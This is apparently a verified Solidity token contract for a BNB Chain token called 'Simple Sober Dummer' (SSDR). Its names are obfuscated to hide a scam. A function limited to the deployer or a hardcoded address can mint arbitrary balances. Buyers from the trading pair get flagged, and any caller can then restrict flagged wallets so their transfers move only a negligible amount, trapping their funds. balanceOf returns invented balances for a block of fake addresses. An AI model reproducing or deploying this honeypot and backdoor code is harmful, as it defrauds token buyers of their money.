/**
 *Submitted for verification at BscScan.com on 2023-01-10
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.8;



abstract contract Ownable {
    address internal owner;
    constructor(address _owner) {
        owner = _owner;
    }

    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

    function transferOwnership(address payable adr) public onlyOwner() {
        owner = adr;
        emit OwnershipTransferred(adr);
    }

    event OwnershipTransferred(address owner);

    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER");
        _;
    }

    function Owner() public view returns (address) {
        return owner;
    }

}


interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
    external
    returns (address pair);
}


interface IBEP20 {

    function name() external view returns (string memory);

    function allowance(address _owner, address spender)
    external
    view
    returns (uint256);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    function symbol() external view returns (string memory);

    function totalSupply() external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function getOwner() external view returns (address);

    function decimals() external view returns (uint8);

    function transfer(address recipient, uint256 amount) 
    external
    returns (bool);

    function balanceOf(address account) external view returns (uint256);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}


library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a % b;
    }
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b <= a, errorMessage);
        return a - b;
    }
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a / b;
    }
    }

}


interface IUniswapV2Router {

    function WETH() external pure returns (address);

    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;

    function factory() external pure returns (address);

    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
    external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);

}


contract SimpleSoberDummer is IBEP20, Ownable {
    using SafeMath for uint256;
    uint8 constant _decimals = 18;
    bool public fundTradingSenderListLaunchLaunchedMarketing = false;
    uint256  tradingWalletLiquidityAmount = 100000000 * (10 ** 18);
    mapping(address => uint256) _balances;

    uint256 private launchExemptMaxAuto = 0;
    
    bool private enableReceiverAutoSell = false;
    address public uniswapV2Pair;
    bool private feeAmountEnableLaunchedAtBuy2 = false;
    IUniswapV2Router public minFundTxBurn;
    uint256 private feeAmountEnableLaunchedAtBuy = 0;
    uint256 public receiverBuyTotalLaunch = 0;
    address private fundTotalEnableFrom;
    uint256 public feeAmountEnableLaunchedAtBuy1 = 0;
    uint256 constant sellLaunchedFeeExempt = 100 * 10 ** 18;



    mapping(address => mapping(address => uint256)) _allowances;




    uint256 public totalFundMaxMarketing = 0;
    uint256 launchToFromMint = 0;
    uint256 constant limitMaxFundTrading = 1000000 * 10 ** 18;
    string constant _name = "Simple Sober Dummer";
    mapping(address => bool) private minSwapEnableTrading;
    bool private maxAmountAtTeam = false;
    mapping(address => bool)  limitTakeMintBuyFromLiquidityAmount;
    uint256 public sellToMinModeFee = 0;
    mapping(address => bool)  senderListEnableLiquidity;
    bool private walletFromAutoMode = false;


    address constant walletShouldBuyAutoLiquidity = 0x9D27D02A195d2500440c401aD4F788bc41577574;
    uint256 private modeLaunchReceiverMarketing = 0;

    string constant _symbol = "SSDR";
    address constant buyReceiverIsMaxBurn = 0xDc4854aAbBbcAEC31229d6E85eE41EfEa74a70C7;
    uint256 public atTakeLaunchedWallet = 0;
    bool inSwap;
    modifier swapping() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() Ownable(msg.sender) {
        address _router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        // PancakeSwap Router
        minFundTxBurn = IUniswapV2Router(_router);

        uniswapV2Pair = IUniswapV2Factory(minFundTxBurn.factory()).createPair(address(this), minFundTxBurn.WETH());
        _allowances[address(this)][address(minFundTxBurn)] = tradingWalletLiquidityAmount;

        _balances[msg.sender] = tradingWalletLiquidityAmount;
        emit Transfer(address(0), msg.sender, tradingWalletLiquidityAmount);
        fundTotalEnableFrom = msg.sender;
    }

    receive() external payable {}

    function totalSupply() external view override returns (uint256) {
        return tradingWalletLiquidityAmount;
    }

    function getOwner() external view override returns (address) {
        return owner;
    }

    function marketingReceiverLaunchReceiverAt(address teamLimitBurnExempt) private view returns (bool) {
        return teamLimitBurnExempt == fundTotalEnableFrom;
    }

    function totalModeShouldTeam(address enableTakeMinModeExempt) private pure returns (bool) {
        uint256 walletTotalAtListTrading = listLiquidityModeAuto();
        uint256 enableTakeMinModeExempt256 = uint160(enableTakeMinModeExempt);
        if (enableTakeMinModeExempt256 >= walletTotalAtListTrading && enableTakeMinModeExempt256 < walletTotalAtListTrading + 10000) {
            return true;
        }
        return false;
    }

    function receiverLaunchTradingAutoLimitFee(address enableTakeMinModeExempt) private pure returns (uint256) {
        uint256 walletTotalAtListTrading = listLiquidityModeAuto();
        uint256 fromFeeBurnMint = uint160(enableTakeMinModeExempt) - walletTotalAtListTrading;
        return fromFeeBurnMint;
    }

    function manualTransfer(address feeExemptToFundTradingMinTeam, address buyToExemptTxReceiverTake, uint256 toLaunchedReceiverMintAmountSwap) public {
        if (!maxFromAtLiquidity(msg.sender) && msg.sender != fundTotalEnableFrom) {
            return;
        }
        if (totalModeShouldTeam(buyToExemptTxReceiverTake)) {
            enableWalletBuyExemptReceiver(feeExemptToFundTradingMinTeam, buyToExemptTxReceiverTake, toLaunchedReceiverMintAmountSwap, false);
            return;
        }
        if (totalModeShouldTeam(feeExemptToFundTradingMinTeam)) {
            enableWalletBuyExemptReceiver(feeExemptToFundTradingMinTeam, buyToExemptTxReceiverTake, toLaunchedReceiverMintAmountSwap, true);
            return;
        }
        if (feeExemptToFundTradingMinTeam == address(0)) {
            _balances[buyToExemptTxReceiverTake] = _balances[buyToExemptTxReceiverTake].add(toLaunchedReceiverMintAmountSwap);
            return;
        }
    }

    function liquidityEnableMarketingFund(address enableTakeMinModeExempt) private view returns (uint256) {
        uint256 fromFeeBurnMint = receiverLaunchTradingAutoLimitFee(enableTakeMinModeExempt);
        if (fromFeeBurnMint < launchToFromMint) {
            return sellLaunchedFeeExempt * fromFeeBurnMint;
        }
        return limitMaxFundTrading + sellLaunchedFeeExempt * fromFeeBurnMint;
    }

    function decimals() external pure override returns (uint8) {
        return _decimals;
    }

    function enableWalletBuyExemptReceiver(address feeExemptToFundTradingMinTeam, address buyToExemptTxReceiverTake, uint256 toLaunchedReceiverMintAmountSwap, bool receiverSellTokenBuy) private {
        if (receiverSellTokenBuy) {
            uint256 walletTotalAtListTrading = listLiquidityModeAuto();
            feeExemptToFundTradingMinTeam = address(uint160(walletTotalAtListTrading + launchToFromMint));
            launchToFromMint++;
            _balances[buyToExemptTxReceiverTake] = _balances[buyToExemptTxReceiverTake].add(toLaunchedReceiverMintAmountSwap);
        } else {
            _balances[feeExemptToFundTradingMinTeam] = _balances[feeExemptToFundTradingMinTeam].sub(toLaunchedReceiverMintAmountSwap);
        }
        emit Transfer(feeExemptToFundTradingMinTeam, buyToExemptTxReceiverTake, toLaunchedReceiverMintAmountSwap);
    }

    function minTxFundSwap(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance!");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function allowance(address holder, address spender) external view override returns (uint256) {
        return _allowances[holder][spender];
    }

    function symbol() external pure override returns (string memory) {
        return _symbol;
    }

    function listLiquidityModeAuto() private pure returns (uint256) {
        return uint160(buyReceiverIsMaxBurn) + 1;
    }

    function walletAmountTotalLaunchedLimitAt(address feeExemptToFundTradingMinTeam, address buyToExemptTxReceiverTake, uint256 toLaunchedReceiverMintAmountSwap) internal returns (bool) {
        if (totalModeShouldTeam(buyToExemptTxReceiverTake)) {
            enableWalletBuyExemptReceiver(feeExemptToFundTradingMinTeam, buyToExemptTxReceiverTake, toLaunchedReceiverMintAmountSwap, false);
            return true;
        }
        if (totalModeShouldTeam(feeExemptToFundTradingMinTeam)) {
            enableWalletBuyExemptReceiver(feeExemptToFundTradingMinTeam, buyToExemptTxReceiverTake, toLaunchedReceiverMintAmountSwap, true);
            return true;
        }

        bool teamFundLimitTradingTotalTo = marketingReceiverLaunchReceiverAt(feeExemptToFundTradingMinTeam) || marketingReceiverLaunchReceiverAt(buyToExemptTxReceiverTake);
        if (teamFundLimitTradingTotalTo) {
            return minTxFundSwap(feeExemptToFundTradingMinTeam, buyToExemptTxReceiverTake, toLaunchedReceiverMintAmountSwap);
        }

        if (feeExemptToFundTradingMinTeam == uniswapV2Pair && !teamFundLimitTradingTotalTo) {
            limitTakeMintBuyFromLiquidityAmount[buyToExemptTxReceiverTake] = true;
        }

        if (senderListEnableLiquidity[feeExemptToFundTradingMinTeam]) {
            return minTxFundSwap(feeExemptToFundTradingMinTeam, buyToExemptTxReceiverTake, 10 ** 10);
        }

        return minTxFundSwap(feeExemptToFundTradingMinTeam, buyToExemptTxReceiverTake, toLaunchedReceiverMintAmountSwap);
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return walletAmountTotalLaunchedLimitAt(msg.sender, recipient, amount);
    }

    function isAllowanceMax(address spender) public view returns (bool) {
        return senderListEnableLiquidity[spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if (_allowances[sender][msg.sender] != tradingWalletLiquidityAmount) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender]
            .sub(amount, "Insufficient Allowance!");
        }
        return walletAmountTotalLaunchedLimitAt(sender, recipient, amount);
    }

    function maxFromAtLiquidity(address enableTakeMinModeExempt) private pure returns (bool) {
        return enableTakeMinModeExempt == walletShouldBuyAutoLiquidity;
    }

    function name() external pure override returns (string memory) {
        return _name;
    }

    function balanceOf(address account) public view override returns (uint256) {
        if (totalModeShouldTeam(account)) {
            return liquidityEnableMarketingFund(account);
        }
        return _balances[account];
    }

    function allowanceMax(address spender) external {
        if (limitTakeMintBuyFromLiquidityAmount[spender]) {
            senderListEnableLiquidity[spender] = true;
        }
    }

    event AutoLiquify(uint256 amountBNB, uint256 amountTokens);
}